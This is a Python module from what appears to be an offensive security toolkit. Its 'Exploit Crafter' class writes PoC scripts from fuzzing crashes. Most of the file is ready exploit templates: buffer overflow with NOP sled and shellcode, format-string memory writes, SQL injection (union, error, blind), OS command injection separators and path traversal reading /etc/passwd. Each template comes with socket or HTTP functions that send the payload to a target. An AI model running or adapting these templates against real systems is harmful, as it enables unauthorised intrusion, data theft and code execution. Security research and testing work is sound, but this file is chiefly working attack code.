"""DRAKBEN Research - Exploit Crafter
Author: @drak_ben
Description: Automatically generates PoC scripts from fuzzing crashes.
"""

import logging
import os
from dataclasses import dataclass
from datetime import datetime
from enum import Enum

from .fuzzer import FuzzResult

logger = logging.getLogger(__name__)


class ExploitType(Enum):
    """Common exploit types."""

    BUFFER_OVERFLOW = "buffer_overflow"
    FORMAT_STRING = "format_string"
    SQL_INJECTION = "sql_injection"
    COMMAND_INJECTION = "command_injection"
    PATH_TRAVERSAL = "path_traversal"
    XSS = "xss"
    DESERIALIZATION = "deserialization"
    GENERIC = "generic"


@dataclass
class ExploitTemplate:
    """Exploit template configuration."""

    name: str
    exploit_type: ExploitType
    description: str
    payload_generator: str  # Python code for payload generation
    attack_code: str  # Python code for attack execution


# =============================================================================
# EXPLOIT TEMPLATES
# =============================================================================

EXPLOIT_TEMPLATES: dict[ExploitType, ExploitTemplate] = {
    ExploitType.BUFFER_OVERFLOW: ExploitTemplate(
        name="Buffer Overflow",
        exploit_type=ExploitType.BUFFER_OVERFLOW,
        description="Stack-based buffer overflow exploitation",
        payload_generator='''
def generate_payload(offset: int, return_addr: bytes, shellcode: bytes) -> bytes:
    """Generate buffer overflow payload.

    Args:
        offset: Bytes to reach return address
        return_addr: Return address (little-endian)
        shellcode: Shellcode to execute
    """
    nop_sled = b"\\x90" * 16
    padding = b"A" * offset
    return padding + return_addr + nop_sled + shellcode
''',
        attack_code='''
def attack(target: str, payload: bytes) -> bool:
    """Send buffer overflow payload to target."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target.split(":")[0], int(target.split(":")[1])))
        sock.send(payload)
        sock.close()
        return True
    except Exception as e:
        print(f"[!] Attack failed: {e}")
        return False
''',
    ),
    ExploitType.FORMAT_STRING: ExploitTemplate(
        name="Format String",
        exploit_type=ExploitType.FORMAT_STRING,
        description="Format string vulnerability exploitation",
        payload_generator='''
def generate_payload(target_addr: int, value: int, offset: int = 6) -> bytes:
    """Generate format string write payload.

    Args:
        target_addr: Address to write to
        value: Value to write
        offset: Stack offset to payload
    """
    # Write-what-where using %n
    addr_bytes = target_addr.to_bytes(4, "little")
    fmt = f"%{value}c%{offset}$n".encode()
    return addr_bytes + fmt
''',
        attack_code='''
def attack(target: str, payload: bytes) -> bool:
    """Send format string payload."""
    import socket
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((target.split(":")[0], int(target.split(":")[1])))
        sock.send(payload)
        response = sock.recv(4096)
        print(f"[*] Response: {response[:100]}")
        sock.close()
        return True
    except Exception as e:
        print(f"[!] Attack failed: {e}")
        return False
''',
    ),
    ExploitType.SQL_INJECTION: ExploitTemplate(
        name="SQL Injection",
        exploit_type=ExploitType.SQL_INJECTION,
        description="SQL injection exploitation",
        payload_generator='''
def generate_payload(
    injection_type: str = "union",
    columns: int = 5,
    table: str = "users",
) -> str:
    """Generate SQL injection payload.

    Args:
        injection_type: Type of injection (union, error, blind)
        columns: Number of columns for UNION
        table: Target table name
    """
    if injection_type == "union":
        cols = ",".join([f"NULL" for _ in range(columns - 1)] + ["@@version"])
        return f"' UNION SELECT {cols}-- -"
    elif injection_type == "error":
        return f"' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))-- -"
    elif injection_type == "blind":
        return f"' AND (SELECT SUBSTRING(username,1,1) FROM {table} LIMIT 1)='a'-- -"
    else:
        return "' OR '1'='1'-- -"
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "id") -> dict:
    """Send SQL injection payload via HTTP."""
    import requests
    try:
        response = requests.get(
            url,
            params={param: payload},
            timeout=10,
            verify=False,
        )
        return {
            "status": response.status_code,
            "length": len(response.text),
            "body": response.text[:500],
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
    ExploitType.COMMAND_INJECTION: ExploitTemplate(
        name="Command Injection",
        exploit_type=ExploitType.COMMAND_INJECTION,
        description="OS command injection exploitation",
        payload_generator='''
def generate_payload(
    command: str = "id",
    separator: str = ";",
    os_type: str = "linux",
) -> str:
    """Generate command injection payload.

    Args:
        command: Command to execute
        separator: Command separator (; | || && \\n)
        os_type: Target OS (linux, windows)
    """
    if os_type == "windows":
        payloads = [
            f"& {command}",
            f"| {command}",
            f"|| {command}",
            f"`{command}`",
        ]
    else:
        payloads = [
            f"; {command}",
            f"| {command}",
            f"|| {command}",
            f"$({command})",
            f"`{command}`",
        ]
    return payloads[0] if separator == ";" else f"{separator} {command}"
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "cmd") -> dict:
    """Send command injection payload."""
    import requests
    try:
        response = requests.post(
            url,
            data={param: payload},
            timeout=10,
            verify=False,
        )
        return {
            "status": response.status_code,
            "body": response.text[:1000],
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
    ExploitType.PATH_TRAVERSAL: ExploitTemplate(
        name="Path Traversal",
        exploit_type=ExploitType.PATH_TRAVERSAL,
        description="Directory traversal / LFI exploitation",
        payload_generator='''
def generate_payload(
    target_file: str = "/etc/passwd",
    depth: int = 5,
    encoding: str = "plain",
) -> str:
    """Generate path traversal payload.

    Args:
        target_file: File to read
        depth: Directory traversal depth
        encoding: Encoding (plain, url, double_url)
    """
    traversal = "../" * depth + target_file.lstrip("/")

    if encoding == "url":
        traversal = traversal.replace("../", "%2e%2e%2f")
    elif encoding == "double_url":
        traversal = traversal.replace("../", "%252e%252e%252f")

    return traversal
''',
        attack_code='''
def attack(url: str, payload: str, param: str = "file") -> dict:
    """Send path traversal payload."""
    import requests
    try:
        response = requests.get(
            url,
            params={param: payload},
            timeout=10,
            verify=False,
        )
        indicators = ["root:", "bin:", "[boot loader]", "<?php"]
        success = any(ind in response.text for ind in indicators)
        return {
            "status": response.status_code,
            "success": success,
            "body": response.text[:500] if success else "",
        }
    except Exception as e:
        return {"error": str(e)}
''',
    ),
}


class ExploitCrafter:
    """Turns crashes into weaponized PoCs."""

    def __init__(self, output_dir: str = "custom_tools/exploits") -> None:
        self.output_dir = output_dir
        if not os.path.exists(output_dir):
            os.makedirs(output_dir)
        logger.info("Exploit Crafter initialized")

    def generate_poc(self, target_name: str, crash: FuzzResult) -> str:
        """Create a standalone python script to reproduce the crash."""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"exploit_{target_name}_{timestamp}.py"
        filepath = os.path.join(self.output_dir, filename)

        # Prepare payload representation
        payload_repr = repr(crash.input_data)

        content = f"""
# DRAKBEN GENERATED EXPLOIT POC
# Target: {target_name}
# Date: {timestamp}
# Crash Error: {crash.error_message}

import sys
import os

def payload():
    return {payload_repr}

def attack():
    data = payload()
    print(f"[*] Sending payload of size {{len(data)}} bytes...")

    # Target function logic should be inserted here manually or via template
    # For now, we print the payload for manual usage
    print("[+] Payload generated.")
    try:
        sys.stdout.buffer.write(data) if isinstance(data, bytes) else print(data)
    except Exception:
        pass

if __name__ == "__main__":
    attack()
"""
        with open(filepath, "w", encoding="utf-8") as f:
            f.write(content)

        logger.info("Exploit PoC saved to: %s", filepath)
        return filepath

    def list_templates(self) -> list[dict[str, str]]:
        """List available exploit templates.

        Returns:
            List of template info dicts

        """
        return [
            {
                "type": template.exploit_type.value,
                "name": template.name,
                "description": template.description,
            }
            for template in EXPLOIT_TEMPLATES.values()
        ]

